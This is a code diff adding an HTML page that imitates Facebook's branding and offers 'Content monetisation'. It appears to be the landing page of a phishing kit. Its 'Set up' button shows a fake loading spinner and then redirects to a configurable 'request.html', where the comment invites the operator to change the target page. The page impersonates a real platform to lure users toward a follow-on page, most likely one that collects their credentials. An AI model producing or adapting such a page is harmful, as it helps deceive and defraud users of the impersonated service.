@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Content Monetisation - Facebook</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-blue: #1877F2;
+      --primary-blue-hover: #0E66D0;
+      --primary-blue-active: #0D5ABC;
+      --text-primary: #1C1E21;
+      --text-secondary: #65676B;
+      --background: #F0F2F5;
+      --card-background: #FFFFFF;
+      --modal-background: rgba(0, 0, 0, 0.4);
+      --shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      --shadow-hover: 0 4px 8px rgba(0, 0, 0, 0.15);
+      --border-radius: 8px;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: var(--background);
+      color: var(--text-primary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .setup-card {
+      background-color: var(--card-background);
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+      display: flex;
+      max-width: 700px;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .setup-card__content {
+      padding: 24px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+
+    .setup-card__description {
+      font-size: 16px;
+      color: var(--text-secondary);
+      margin-bottom: 24px;
+    }
+
+    .setup-card__button {
+      background-color: var(--primary-blue);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 10px 16px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      align-self: flex-end;
+      margin-top: 20px;
+    }
+
+    .setup-card__button:hover {
+      background-color: var(--primary-blue-hover);
+    }
+
+    /* Loader */
+    .loader-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(255,255,255,0.9);
+      z-index: 2000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid var(--primary-blue);
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    .loading-text {
+      font-size: 16px;
+      color: var(--text-secondary);
+    }
+  </style>
+</head>
+<body>
+  <div class="setup-card">
+    <div class="setup-card__content">
+      <h2 class="setup-card__title">Content monetisation</h2>
+      <p class="setup-card__description">Earn money from Facebook for all of your eligible content in one place.</p>
+      <button class="setup-card__button" id="setupButton">Set up</button>
+    </div>
+  </div>
+
+  <!-- Loader -->
+  <div class="loader-overlay" id="loader">
+    <div class="spinner"></div>
+    <div class="loading-text">loading Please wait......</div>
+  </div>
+
+  <script>
+    document.getElementById("setupButton").addEventListener("click", function() {
+      // Show loader
+      document.getElementById("loader").style.display = "flex";
+      document.body.style.overflow = "hidden";
+
+      // Redirect after 2 seconds
+      setTimeout(function() {
+        window.location.href = "request.html"; // 🔴 Change file/page here
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
